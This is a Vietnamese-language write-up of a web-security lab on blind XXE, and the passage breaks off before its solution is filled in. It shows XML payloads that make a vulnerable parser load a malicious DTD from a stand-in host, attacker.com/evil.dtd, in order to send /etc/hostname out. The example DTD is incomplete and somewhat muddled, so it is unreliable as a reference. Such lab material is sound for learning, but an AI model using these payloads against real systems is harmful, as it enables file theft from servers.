# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, exfiltrate the contents of the /etc/hostname file.

# Example

1. Attacker tạo một tệp DTD độc hại chứa payload để lấy dữ liệu. Tệp DTD có thể có dạng như sau:

```xml
<!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">
<!ENTITY % externalDTD SYSTEM "http://attacker.com/evil.dtd">
%externalDTD;
```

Attacker lưu trữ tệp DTD độc hại trên máy chủ của mình tại URL được chỉ định, chẳng hạn như http://attacker.com/evil.dtd. Tệp DTD này chứa các lệnh để trích xuất và truyền dữ liệu mong muốn.

2. Attacker tạo một payload XXE và tiêm vào ứng dụng có lỗ hổng. Payload này tham chiếu đến tệp DTD bên ngoài độc hại. Ví dụ:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
```

Khi ứng dụng xử lý đầu vào XML, nó sẽ tải tệp DTD bên ngoài được chỉ định trong payload từ máy chủ của kẻ tấn công.

Tệp DTD độc hại chứa hướng dẫn để trích xuất dữ liệu mong muốn, chẳng hạn như truy cập vào các tệp, kết nối đến cơ sở dữ liệu hoặc thực hiện các yêu cầu mạng để truyền dữ liệu về máy chủ của kẻ tấn công.

Dữ liệu nhạy cảm được trích xuất và gửi đến máy chủ do kẻ tấn công kiểm soát.

# Solution:

Ta có form của lab như sau

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/8c22258d-5c53-4290-91c4-dfed90a6ed35)

Làm như tương tự các lab trước, ta check stock

![image](https://github.com/Llam-a/XML-external-entity-XXE-injection/assets/115911041/3e590be1-3c13-40b7-879f-452a6ce7a0a5)

Tiếp theo mình có 1 file DTD ở exploit server

```xml

```










